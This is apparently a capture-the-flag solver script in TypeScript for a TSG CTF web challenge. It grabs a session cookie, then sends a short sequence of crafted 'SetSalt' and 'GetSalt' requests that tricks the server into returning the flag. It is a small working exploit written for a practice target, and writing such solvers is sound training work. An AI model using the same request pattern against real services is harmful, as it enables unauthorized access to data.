import axios from 'axios';

if (process.argv.length !== 4) {
	console.log("Usage: ts-node solve.ts <hostname> <port>");
	process.exit(1);
}

const [, , hostname, port] = process.argv;

(async () => {
	const res = await axios.get(`http://${hostname}:${port}/`);
	const cookie = res.headers['set-cookie'][0].split(';')[0];

	await axios.get(`http://${hostname}:${port}/?action=SetSalt&data=flag`, {headers: {cookie}});
	await axios.get(`http://${hostname}:${port}/?action=SetSalt&data=then`, {headers: {cookie}, validateStatus: null});
	const {data: flag} = await axios.get(`http://${hostname}:${port}/?action=GetSalt`, {headers: {cookie}});
	console.log(flag);
	if (!flag.includes('TSGCTF{')) {
		process.exit(1);
	}
})();
